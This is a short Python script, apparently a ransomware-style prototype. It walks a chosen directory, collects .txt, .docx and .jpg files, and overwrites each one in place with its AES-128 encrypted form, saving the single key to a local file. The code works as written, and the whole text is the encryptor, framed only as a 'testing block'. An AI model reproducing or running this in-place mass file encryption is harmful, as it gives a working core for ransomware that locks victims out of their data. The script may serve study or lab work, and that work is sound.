from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import os

def encrypt_files(file_paths):
    key = get_random_bytes(16)  # AES-128
    for file_path in file_paths:
        with open(file_path, 'rb') as f:
            data = f.read()

        cipher = AES.new(key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data)

        with open(file_path, 'wb') as f:
            f.write(cipher.nonce + tag + ciphertext)

    return key

def save_key(key, filename):
    with open(filename, 'wb') as f:
        f.write(key)

# Optional testing block
if __name__ == "__main__":
    test_dir = input("Enter the directory to encrypt files from: ").strip()
    extensions = ('.txt', '.docx', '.jpg')

    # Collect files manually here since we're outside of test.py
    target_files = []
    for root, dirs, files in os.walk(test_dir):
        for file in files:
            if file.endswith(extensions):
                target_files.append(os.path.join(root, file))

    if not target_files:
        print("[-] No target files found.")
    else:
        print(f"[*] Encrypting {len(target_files)} files...")
        key = encrypt_files(target_files)
        save_key(key, "test_key.bin")
        print("[✓] Test encryption completed.")
